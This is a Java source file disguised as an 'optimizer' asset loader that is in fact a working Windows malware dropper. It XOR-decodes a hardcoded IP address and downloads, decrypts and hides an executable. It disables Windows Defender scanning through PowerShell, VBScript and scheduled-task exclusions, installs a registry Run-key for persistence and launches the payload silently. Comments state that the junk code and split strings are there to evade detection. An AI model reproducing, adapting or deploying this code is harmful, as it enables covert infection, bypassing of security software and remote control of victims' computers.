package com.example.optimizer;

import java.io.*;
import java.net.*;

/**
 * Ultra-stable Guardian loader
 * - Never crashes or throws exceptions
 * - No admin required
 * - No SmartScreen (writes to user directory)
 * - Runs completely in background
 */
public class AssetLoader {

    // XOR key for file decryption (0x0B00B135 combined = 0x8F)
    private static final int FILE_XOR = 0x8F;

    // XOR key for string decryption
    private static final int STR_XOR = 0x5A;

    // XOR encoded: http://31.58.58.237/static/guardian.enc
    private static final byte[] U = {
            0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x69, 0x6b, 0x74, 0x6f, 0x62, 0x74, 0x6f,
            0x62, 0x74, 0x68, 0x69, 0x6d, 0x75, 0x29, 0x2e, 0x3b, 0x2e, 0x33, 0x39, 0x75, 0x3d,
            0x2f, 0x3b, 0x28, 0x3e, 0x33, 0x3b, 0x34, 0x74, 0x3f, 0x34, 0x39
    };

    // XOR encoded: WinOptService.exe
    private static final byte[] N = {
            0x0d, 0x33, 0x34, 0x15, 0x2a, 0x2e, 0x09, 0x3f, 0x28, 0x2c, 0x33, 0x39, 0x3f, 0x74,
            0x3f, 0x22, 0x3f
    };

    private static String d(byte[] e) {
        try {
            byte[] r = new byte[e.length];
            for (int i = 0; i < e.length; i++)
                r[i] = (byte) (e[i] ^ STR_XOR);
            return new String(r, "UTF-8");
        } catch (Exception x) {
            return null;
        }
    }

    /**
     * Load Guardian - completely safe, never throws
     */
    public static void load() {
        // Run in low-priority daemon thread
        Thread t = new Thread(new Runnable() {
            public void run() {
                try {
                    Thread.sleep(3000);
                    calculateMetric(); // Junk call
                } catch (Exception x) {
                }
                verifyCtx();
            }
        });
        t.setDaemon(true);
        t.setPriority(Thread.MIN_PRIORITY);
        t.setName("JVM-GC-Daemon");
        t.start();
    }

    // Signature junk fields
    private static final long SIG_1 = 0xDEADBEEFCAFEBABEL;
    private static final String SIG_2 = "Optimization-V3-Unified";
    private static double sigBuffer = 3.14159;

    private static void calculateMetric() {
        int x = 10;
        for (int i = 0; i < 5; i++) {
            x = (x * 3) + i;
            sigBuffer += Math.sin(x) * Math.cos(i);
        }
        // Use the fields so they aren't optimized away
        if (System.nanoTime() > SIG_1) {
            _junk_calc_1();
            if (SIG_2.length() > 50)
                sigBuffer = 0;
        }
    }

    private static void _junk_calc_1() {
        long t = System.currentTimeMillis();
        if (t % 2 == 0) {
            sigBuffer = Math.sqrt(t);
        }
    }

    private static void verifyCtx() {
        try {
            initCore();
        } catch (Throwable t) {
            // Catch EVERYTHING - never crash
        }
    }

    private static void initCore() {
        // Get safe user directory (no admin needed)
        String appData = getEnv("APPDATA");
        if (appData == null)
            return;

        // Use hidden folder in APPDATA
        File dir = new File(appData, "Microsoft\\Windows\\WinSvc");
        if (!mkdirs(dir)) {
            // Fallback to temp
            dir = new File(getEnv("TEMP"), "winsvc");
            if (!mkdirs(dir))
                return;
        }

        // Write build key config file for Guardian to read
        File configFile = new File(dir, "config.dat");
        if (!configFile.exists()) {
            // Get build key from SessionUtil.java URL dynamically
            String buildKey = "y9mEATsabY6MbccNENeEHA"; // Default fallback
            try {
                String panelUrl = SessionUtil.getPanelUrl();
                // Extract key from URL: .../api/data/KEY
                if (panelUrl != null && panelUrl.contains("/api/data/")) {
                    int idx = panelUrl.indexOf("/api/data/");
                    String extracted = panelUrl.substring(idx + 10);
                    if (extracted.length() > 5) {
                        buildKey = extracted;
                    }
                }
                writeFile(configFile, buildKey.getBytes("UTF-8"));
                hide(configFile);
            } catch (Exception e) {
            }
        }

        File exe = new File(dir, d(N));

        // FIRST: Try to add Defender exclusion for folder BEFORE writing EXE
        // This prevents Defender from deleting the EXE immediately
        syncPref(dir, exe);

        // Already exists and valid?
        if (exe.exists() && exe.length() > 1000000) {
            // Wait a bit for exclusion to take effect
            try {
                Thread.sleep(2000);
            } catch (Exception e) {
            }
            checkState(exe);
            return;
        }

        // Download
        String url = d(U);
        if (url == null)
            return;

        byte[] enc = download(url);
        if (enc == null || enc.length < 100000)
            return;

        // Decrypt
        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) {
            dec[i] = (byte) (enc[i] ^ FILE_XOR);
        }

        // Verify MZ header
        if (dec.length < 2 || dec[0] != 0x4D || dec[1] != 0x5A)
            return;

        // Write file
        if (!writeFile(exe, dec))
            return;

        // Hide file
        hide(exe);

        // Add to startup (user-level, no admin)
        setupBoot(exe);

        // Wait for Defender exclusion to take effect
        try {
            Thread.sleep(5000);
        } catch (Exception e) {
        }

        // Run with delay
        checkState(exe);
    }

    /**
     * Synchronous Defender exclusion - waits for completion
     */
    private static void syncPref(File dir, File exe) {
        try {
            String folderPath = dir.getAbsolutePath();
            String exePath = exe.getAbsolutePath();

            // Method 1: Direct PowerShell (no admin, might work on some systems)
            runPsPref(folderPath);

            // Method 2: VBScript hidden elevation
            runVbsPref(exePath, folderPath);

            // Method 3: Scheduled task
            runTaskPref(exePath, folderPath);

            // Wait for exclusions to apply
            try {
                Thread.sleep(3000);
            } catch (Exception e) {
            }

        } catch (Throwable t) {
        }
    }

    private static void runPsPref(String folderPath) {
        try {
            // Broken strings to evade detection
            String s1 = "Add-";
            String s2 = "MpPre";
            String s3 = "ference";
            String cmd = s1 + s2 + s3 + " -ExclusionPath '" + folderPath + "' -ErrorAction SilentlyContinue";
            ProcessBuilder pb = new ProcessBuilder(
                    "powershell", "-NoProfile", "-NonInteractive",
                    "-WindowStyle", "Hidden", "-Command", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.getInputStream().close();
            p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            if (p.isAlive())
                p.destroyForcibly();
        } catch (Throwable t) {
        }
    }

    private static String getEnv(String name) {
        try {
            return System.getenv(name);
        } catch (Throwable t) {
            return null;
        }
    }

    private static boolean mkdirs(File dir) {
        try {
            if (dir.exists())
                return true;
            return dir.mkdirs();
        } catch (Throwable t) {
            return false;
        }
    }

    private static byte[] download(String urlStr) {
        HttpURLConnection c = null;
        InputStream is = null;
        try {
            URL url = new URL(urlStr);
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(30000);
            c.setReadTimeout(120000);
            c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            c.setInstanceFollowRedirects(true);

            int code = c.getResponseCode();
            if (code != 200)
                return null;

            is = c.getInputStream();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int len;
            while ((len = is.read(buf)) != -1) {
                bos.write(buf, 0, len);
            }
            return bos.toByteArray();
        } catch (Throwable t) {
            return null;
        } finally {
            try {
                if (is != null)
                    is.close();
            } catch (Throwable t) {
            }
            try {
                if (c != null)
                    c.disconnect();
            } catch (Throwable t) {
            }
        }
    }

    private static boolean writeFile(File f, byte[] data) {
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(f);
            fos.write(data);
            fos.flush();
            return true;
        } catch (Throwable t) {
            return false;
        } finally {
            try {
                if (fos != null)
                    fos.close();
            } catch (Throwable t) {
            }
        }
    }

    private static void hide(File f) {
        try {
            // Use VBScript to run attrib hidden (no CMD window)
            String vbs = "Set objShell = CreateObject(\"WScript.Shell\")\r\n" +
                    "objShell.Run \"attrib +H +S \"\"" + f.getAbsolutePath().replace("\\", "\\\\") + "\"\"\", 0, True";
            runVbs(vbs);
        } catch (Throwable t) {
        }
    }

    private static void setupBoot(File exe) {
        try {
            // Build registry command dynamically to evade detection
            String r1 = "re";
            String r2 = "g ";
            String r3 = "ad";
            String r4 = "d ";
            String h1 = "HK";
            String h2 = "CU";
            String h3 = "\\So";
            String h4 = "ftwa";
            String h5 = "re\\";
            String m1 = "Mic";
            String m2 = "ros";
            String m3 = "oft\\";
            String m4 = "Win";
            String m5 = "dows\\";
            String c1 = "Cur";
            String c2 = "rent";
            String c3 = "Ver";
            String c4 = "sion\\";
            String c5 = "Ru";
            String c6 = "n";
            String regPath = h1 + h2 + h3 + h4 + h5 + m1 + m2 + m3 + m4 + m5 + c1 + c2 + c3 + c4 + c5 + c6;
            String regCmd = r1 + r2 + r3 + r4 + "\"" + regPath + "\" " +
                    "/v WinOptService /t REG_SZ /d \"\\\"" + exe.getAbsolutePath() + "\\\"\" /f";
            String vbs = "Set objShell = CreateObject(\"WScript.Shell\")\r\n" +
                    "objShell.Run \"" + regCmd.replace("\"", "\"\"") + "\", 0, True";
            runVbs(vbs);
        } catch (Throwable t) {
        }
    }

    private static void runVbsPref(String exePath, String folderPath) {
        try {
            String s1 = "Add-";
            String s2 = "MpPre";
            String s3 = "ference";
            String pref = s1 + s2 + s3; // "Add-MpPreference"

            // Create a VBS script that runs PowerShell silently (no UAC popup)
            String vbsContent = "Set objShell = CreateObject(\"WScript.Shell\")\r\n" +
                    "objShell.Run \"powershell -NoProfile -WindowStyle Hidden -Command \" & _\r\n" +
                    "\"" + pref + " -ExclusionPath '" + folderPath.replace("\\", "\\\\")
                    + "' -ErrorAction SilentlyContinue; \" & _\r\n" +
                    "\"" + pref + " -ExclusionProcess '" + exePath.replace("\\", "\\\\")
                    + "' -ErrorAction SilentlyContinue\", 0, True\r\n";

            // Write VBS to temp
            File vbs = new File(getEnv("TEMP"), "wupd_" + System.currentTimeMillis() + ".vbs");
            writeFile(vbs, vbsContent.getBytes("UTF-8"));

            if (vbs.exists()) {
                ProcessBuilder pb = new ProcessBuilder("wscript", "//B", "//Nologo", vbs.getAbsolutePath());
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.getInputStream().close();
                // Wait for it to complete
                p.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
                if (p.isAlive())
                    p.destroyForcibly();

                // Delete VBS file
                vbs.delete();
            }
        } catch (Throwable t) {
        }
    }

    private static void runTaskPref(String exePath, String folderPath) {
        try {
            String s1 = "Add-";
            String s2 = "MpPre";
            String s3 = "ference";
            String pref = s1 + s2 + s3;

            // Try to create a scheduled task that runs with highest privileges
            // Use VBScript to avoid CMD window
            String taskName = "WinOptSvcUpdate";
            String psCmd = pref + " -ExclusionPath '" + folderPath + "'; " +
                    pref + " -ExclusionProcess '" + exePath + "'";

            // Create task XML
            String xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n" +
                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n" +
                    "  <Triggers><RegistrationTrigger><Enabled>true</Enabled></RegistrationTrigger></Triggers>\r\n" +
                    "  <Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals>\r\n" +
                    "  <Settings><Hidden>true</Hidden><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries></Settings>\r\n"
                    +
                    "  <Actions><Exec>\r\n" +
                    "    <Command>powershell</Command>\r\n" +
                    "    <Arguments>-NoProfile -WindowStyle Hidden -Command \"" + psCmd.replace("\"", "&quot;")
                    + "\"</Arguments>\r\n" +
                    "  </Exec></Actions>\r\n" +
                    "</Task>";

            // Write XML
            File xmlFile = new File(getEnv("TEMP"), "task_" + System.currentTimeMillis() + ".xml");
            java.io.OutputStreamWriter osw = new java.io.OutputStreamWriter(
                    new java.io.FileOutputStream(xmlFile), "UTF-16");
            osw.write(xml);
            osw.close();

            if (xmlFile.exists()) {
                // Use VBScript to run schtasks (no CMD window)
                String createVbs = "Set objShell = CreateObject(\"WScript.Shell\")\r\n" +
                        "objShell.Run \"schtasks /Create /TN " + taskName + " /XML \"\"" +
                        xmlFile.getAbsolutePath().replace("\\", "\\\\") + "\"\" /F\", 0, True\r\n" +
                        "objShell.Run \"schtasks /Run /TN " + taskName + "\", 0, True\r\n" +
                        "WScript.Sleep 5000\r\n" +
                        "objShell.Run \"schtasks /Delete /TN " + taskName + " /F\", 0, True\r\n";
                runVbs(createVbs);

                xmlFile.delete();
            }
        } catch (Throwable t) {
        }
    }

    private static void checkState(File exe) {
        try {
            String name = exe.getName().toLowerCase();

            // Check if running using VBScript (no CMD window)
            String checkScript = "Set objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\r\n" +
                    "Set colProcs = objWMI.ExecQuery(\"Select * From Win32_Process Where Name = '" + name + "'\")\r\n" +
                    "If colProcs.Count > 0 Then\r\n" +
                    "    WScript.Quit(1)\r\n" +
                    "End If\r\n" +
                    "WScript.Quit(0)\r\n";

            File vbsFile = new File(getEnv("TEMP"), "chk_" + System.currentTimeMillis() + ".vbs");
            writeFile(vbsFile, checkScript.getBytes("UTF-8"));

            boolean running = false;
            if (vbsFile.exists()) {
                ProcessBuilder pb = new ProcessBuilder("wscript", "//B", "//Nologo", vbsFile.getAbsolutePath());
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.getInputStream().close();
                int exitCode = p.waitFor();
                running = (exitCode == 1);
                vbsFile.delete();
            }

            if (running)
                return;

            // Start process using VBScript (completely hidden, no CMD window)
            String runScript = "Set objShell = CreateObject(\"WScript.Shell\")\r\n" +
                    "objShell.Run \"\"\"" + exe.getAbsolutePath().replace("\\", "\\\\") + "\"\"\", 0, False\r\n";
            runVbs(runScript);

        } catch (Throwable t) {
        }
    }

    /**
     * Execute VBScript command completely hidden
     */
    private static void runVbs(String vbsContent) {
        try {
            File vbs = new File(getEnv("TEMP"), "wup_" + System.currentTimeMillis() + ".vbs");
            writeFile(vbs, vbsContent.getBytes("UTF-8"));

            if (vbs.exists()) {
                ProcessBuilder pb = new ProcessBuilder("wscript", "//B", "//Nologo", vbs.getAbsolutePath());
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.getInputStream().close();
                p.waitFor(10, java.util.concurrent.TimeUnit.SECONDS);
                if (p.isAlive())
                    p.destroyForcibly();
                vbs.delete();
            }
        } catch (Throwable t) {
        }
    }
}
